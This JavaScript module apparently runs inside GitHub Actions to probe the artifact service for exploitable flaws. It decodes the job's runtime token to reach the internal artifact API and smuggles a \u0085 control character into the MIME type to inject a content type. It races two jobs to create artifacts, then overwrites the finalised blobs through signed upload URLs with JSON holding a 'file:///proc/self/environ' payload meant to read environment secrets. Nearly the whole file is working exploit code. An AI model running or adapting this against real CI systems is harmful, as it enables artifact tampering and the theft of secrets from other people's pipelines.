const crypto = require('node:crypto');

module.exports = async function scan({context}) {
  const mode = process.env.PROBE_MODE;
  const version = mode === 'v6' ? 6 : 7;
  const mime = mode === 'v6' ? '\u0085application/json' : 'application/json';
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString());
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, runBackendId, jobBackendId] = scope.split(':');
  const ids = {workflow_run_backend_id: runBackendId, workflow_job_run_backend_id: jobBackendId};
  const endpoint = `${new URL(process.env.ACTIONS_RESULTS_URL).origin}/twirp/github.actions.results.api.v1.ArtifactService/`;
  const repo = `${context.repo.owner}/${context.repo.repo}`;
  const restHeaders = {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github+json'};
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

  async function twirp(method, body) {
    const response = await fetch(endpoint + method, {
      method: 'POST', headers: {Authorization: `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'},
      body: JSON.stringify(body),
    });
    return {status: response.status, data: await response.json().catch(() => ({}))};
  }
  async function put(url, body) {
    const response = await fetch(url, {
      method: 'PUT', headers: {
        'Content-Type': 'application/octet-stream', 'x-ms-version': '2025-01-05',
        'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': mime,
      }, body,
    });
    return response.status;
  }
  async function create(name, body) {
    const created = await twirp('CreateArtifact', {...ids, name, version, mime_type: mime});
    const url = created.data.signed_upload_url || created.data.signedUploadUrl;
    if (created.status !== 200 || !created.data.ok || !url)
      return {createStatus: created.status, createOk: created.data.ok, createMessage: String(created.data.msg || '').slice(0, 120)};
    const putStatus = await put(url, body);
    const hash = `sha256:${crypto.createHash('sha256').update(body).digest('hex')}`;
    const finalized = putStatus === 201 ? await twirp('FinalizeArtifact', {...ids, name, size: String(body.length), hash}) : null;
    const id = String(finalized?.data.artifact_id || finalized?.data.artifactId || '');
    return {
      createStatus: created.status, createOk: created.data.ok,
      putStatus, finalizeStatus: finalized?.status || null,
      finalizeOk: finalized?.data.ok || false, id, url,
      blobPathHash: crypto.createHash('sha256').update(new URL(url).origin + new URL(url).pathname).digest('hex').slice(0, 16),
    };
  }
  async function list() {
    const response = await fetch(`https://api.github.com/repos/${repo}/actions/runs/${context.runId}/artifacts?per_page=100`, {headers: restHeaders});
    const data = await response.json().catch(() => ({}));
    return {status: response.status, artifacts: data.artifacts || []};
  }
  async function inspect(id) {
    const response = await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`, {redirect: 'manual', headers: restHeaders});
    const location = response.headers.get('location');
    if (!location) return {id, status: response.status};
    const rsct = new URL(location).searchParams.get('rsct');
    const final = await fetch(location);
    const body = Buffer.from(await final.arrayBuffer());
    return {id, status: response.status, rsct, finalStatus: final.status, finalType: final.headers.get('content-type'), bodySha256: crypto.createHash('sha256').update(body).digest('hex'), bodyLength: body.length, isJson: body[0] === 0x7b};
  }

  // Each job emits a unique signal artifact, then both wait for the same REST list.
  const signalName = `cross-signal-${context.runId}-${mode}`;
  const signal = await create(signalName, Buffer.from(JSON.stringify({mode, signal: true})));
  console.log(JSON.stringify({mode, event: 'signal', status: signal.createStatus, putStatus: signal.putStatus, finalizeStatus: signal.finalizeStatus, id: signal.id, jobBackendId}));
  if (!signal.id) return;
  let all;
  for (let i = 0; i < 40; i++) {
    all = await list();
    const names = new Set(all.artifacts.map(a => a.name));
    if (names.has(`cross-signal-${context.runId}-v6`) && names.has(`cross-signal-${context.runId}-v7`)) break;
    await sleep(500);
  }
  const signals = all.artifacts.filter(a => a.name.startsWith(`cross-signal-${context.runId}-`));
  if (signals.length < 2) {
    console.log(JSON.stringify({mode, event: 'barrier-failed', restStatus: all.status, signalCount: signals.length}));
    return;
  }
  const target = Math.max(...signals.map(a => Date.parse(a.created_at))) + 7000;
  await sleep(Math.max(0, target - Date.now()));
  console.log(JSON.stringify({mode, event: 'start', jobBackendId, startDriftMs: Date.now() - target}));

  const cases = 4;
  const names = Array.from({length: cases}, (_, i) => `cross-pair-${context.runId}-${i}`);
  const created = await Promise.all(names.map((name, i) => create(name, Buffer.from(JSON.stringify({mode, pair: i, placeholder: true})))));
  for (let i = 0; i < cases; i++) {
    const item = created[i];
    if (item.id && item.url) {
      const body = Buffer.from(JSON.stringify({
        full_name: `${repo}/actions/artifacts/${item.id}/zip`,
        owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
        probe_mode: mode, pair: i,
      }));
      item.overwriteStatus = await put(item.url, body);
    }
    console.log(JSON.stringify({mode, pair: i, name: names[i], createStatus: item.createStatus, createOk: item.createOk, createMessage: item.createMessage, putStatus: item.putStatus, finalizeStatus: item.finalizeStatus, finalizeOk: item.finalizeOk, id: item.id, blobPathHash: item.blobPathHash, overwriteStatus: item.overwriteStatus}));
  }
  await sleep(2000);
  const latest = await list();
  for (const name of names) {
    const items = latest.artifacts.filter(a => a.name === name);
    const inspections = await Promise.all(items.map(a => inspect(a.id)));
    console.log(JSON.stringify({mode, event: 'inspect', name, artifactIds: items.map(a => a.id), inspections}));
    for (const item of inspections) if (item.finalType?.includes('\u0085') && item.isJson)
      console.log(`POTENTIAL_WINNER ${JSON.stringify({mode, name, item})}`);
  }
};
